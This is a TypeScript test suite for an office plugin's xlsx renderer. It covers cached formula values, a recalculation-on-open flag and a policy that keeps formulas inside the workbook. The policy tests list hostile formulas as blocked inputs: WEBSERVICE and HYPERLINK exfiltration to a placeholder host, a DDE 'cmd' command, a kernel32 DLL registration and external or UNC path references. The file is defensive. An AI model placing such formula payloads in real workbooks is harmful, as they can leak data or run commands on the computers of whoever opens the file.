import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import {
  renderXlsx,
  OfficeUnsafeFormulaError,
  XlsxToolInputSchema,
  type XlsxDescriptor,
} from '@omadia/plugin-office';
import { unzipToText } from './_helpers/unzipToText.js';

// omadia evaluates no formulas. A formula cell's displayed value has to come
// from the application that opens the file, and a formula may only compute over
// cells of its own workbook. The storage tests read the parts back out of the
// produced file (`xl/worksheets/sheet1.xml`, `xl/workbook.xml`) rather than
// trusting the renderer input. The policy tests go through renderXlsx, so each
// shows that a refused formula yields no workbook at all.

const plainData: XlsxDescriptor = {
  sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A', type: 'number' }], rows: [{ a: 1 }, { a: 2 }] }],
};

describe('office xlsx formulas — no cached values, recalculation on open', () => {
  // A caller-supplied cache would be stored as if it were the computed figure.
  const cachedResultInput = {
    sheets: [
      {
        name: 'S',
        columns: [
          { key: 'a', header: 'A' },
          { key: 'b', header: 'B', type: 'number' },
        ],
        rows: [{ a: 'x', b: { formula: '1+1', result: 999 } }],
      },
    ],
  };

  it('never persists a descriptor-supplied formula result', async () => {
    // The tool boundary drops the cached value …
    const parsed = XlsxToolInputSchema.safeParse(cachedResultInput);
    assert.ok(parsed.success, 'a formula cell with a result is still valid input');
    assert.deepEqual(parsed.data.sheets[0]?.rows?.[0]?.['b'], { formula: '1+1' });

    // … and the renderer ignores one smuggled past the type (a direct caller).
    const result = await renderXlsx(cachedResultInput as unknown as XlsxDescriptor);
    const sheet = (await unzipToText(result.buffer)).get('xl/worksheets/sheet1.xml') ?? '';
    assert.match(sheet, /<c r="B2"[^>]*><f>1\+1<\/f><\/c>/, 'formula written with no cached value');
    assert.doesNotMatch(sheet, /<f>1\+1<\/f><v>/, 'no <v> next to the formula');
    assert.doesNotMatch(sheet, /<v>999<\/v>/, 'the supplied cache is not stored as any value');
  });

  it('asks the opening application to recalculate when the workbook holds a formula', async () => {
    const workbookXml = async (d: XlsxDescriptor): Promise<string> =>
      (await unzipToText((await renderXlsx(d)).buffer)).get('xl/workbook.xml') ?? '';

    const inlineFormula = await workbookXml({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula: 'SUM(1,2)' } }] }],
    });
    assert.match(inlineFormula, /<calcPr [^>]*fullCalcOnLoad="1"/);

    const computedColumn = await workbookXml({
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'a', header: 'A', type: 'number' },
            { key: 'b', header: 'B', formula: 'A{row}*2' },
          ],
          rows: [{ a: 1 }],
        },
      ],
    });
    assert.match(computedColumn, /<calcPr [^>]*fullCalcOnLoad="1"/);

    // A plain data export has nothing to compute; the flag would only make
    // Excel mark it as changed and ask to save on close.
    const plain = await workbookXml(plainData);
    assert.match(plain, /<calcPr /);
    assert.doesNotMatch(plain, /fullCalcOnLoad/);
  });

  it('stays deterministic when the workbook holds formulas (#645)', async (t) => {
    // The recalculation flag is a constant, so it adds no wall-clock or
    // per-render bytes. It is set only for workbooks that hold a formula: the
    // cache tests in office.test.ts render formula-free descriptors, and making
    // the flag unconditional would change their bytes (and every stored
    // object's key).
    const withFormulas: XlsxDescriptor = {
      sheets: [
        {
          name: 'Data',
          columns: [
            { key: 'betrag', header: 'Betrag', type: 'currency' },
            { key: 'doppelt', header: 'Doppelt', formula: 'A{row}*2' },
          ],
          rows: [{ betrag: 100 }, { betrag: 200 }],
        },
        {
          name: 'Pivot',
          columns: [{ key: 'summe', header: 'Summe' }],
          rows: [{ summe: { formula: 'SUM(Data!A2:A3)' } }],
        },
      ],
    };
    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const a = await renderXlsx(withFormulas);
      t.mock.timers.setTime(1_811_000_000_000); // ~3.5 years later
      const b = await renderXlsx(withFormulas);
      assert.ok(a.buffer.equals(b.buffer), 'wall-clock change must not change bytes');
    } finally {
      t.mock.timers.reset();
    }
  });
});

describe('office formula policy — formulas stay inside the workbook', () => {
  // The opening application recalculates every formula (the workbook asks it
  // to), so a formula that can reach the network, another program or another
  // file would do so the moment someone opens the export.
  const oneFormula = (formula: string): XlsxDescriptor => ({
    sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
  });

  const rejected: ReadonlyArray<readonly [formula: string, why: string, reason: RegExp]> = [
    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data', /uses WEBSERVICE/],
    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix', /uses WEBSERVICE/],
    ['FILTERXML(webservice("https://example.invalid/"),"//a")', 'a lower-case nested call', /uses WEBSERVICE/],
    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK/],
    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch', /uses IMAGE/],
    ['RTD("server.progid",,"topic")', 'a COM real-time data server', /uses RTD/],
    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration', /uses REGISTER\.ID/],
    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value', /uses WEBSERVICE/],
    ["cmd|' /C calc'!A0", 'a DDE command', /DDE reference/],
    ['[1]Sheet1!A1', 'an external workbook by index', /bracketed reference/],
    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by path', /bracketed reference/],
    ["'\\\\host\\share\\book.xlsx'!Total", 'a UNC path', /another file by its path/],
    ['IF(A1="x', 'an unterminated string literal', /unterminated quote/],
  ];

  for (const [formula, why, reason] of rejected) {
    it(`rejects ${why}`, async () => {
      await assert.rejects(renderXlsx(oneFormula(formula)), (err: unknown) => {
        assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${formula}`);
        assert.equal(err.location, 'sheet "S", cell A2');
        assert.match(err.reason, reason);
        return true;
      });
    });
  }

  it('rejects a computed column template before any row is written', async () => {
    const descriptor: XlsxDescriptor = {
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'a', header: 'A' },
            { key: 'link', header: 'Link', formula: 'HYPERLINK("https://example.invalid/?r="&A{row})' },
          ],
          rows: [{ a: 'x' }],
        },
      ],
    };
    await assert.rejects(renderXlsx(descriptor), (err: unknown) => {
      assert.ok(err instanceof OfficeUnsafeFormulaError);
      assert.equal(err.location, 'sheet "S", computed column "link"');
      return true;
    });
  });

  it('keeps formulas that only compute over this workbook', async () => {
    const allowed = [
      'SUM(Data!B2:B3)',
      "SUMIFS('Offene Posten'!E:E,'Offene Posten'!C:C,A2)",
      "SUM('Jan:Dez'!B2)", // 3-D reference across sheets
      "'It''s'!A1", // escaped quote inside a sheet name
      'Image!A1', // a sheet that happens to be called Image
      'IF(A1="WEBSERVICE(x)|[y]\\\\z","a","b")', // text inside a string literal
      'YEAR(A2)&"-"&TEXT(MONTH(A2),"00")',
    ];
    for (const formula of allowed) {
      const result = await renderXlsx(oneFormula(formula));
      assert.equal(result.rowsWritten, 1, formula);
    }
  });
});
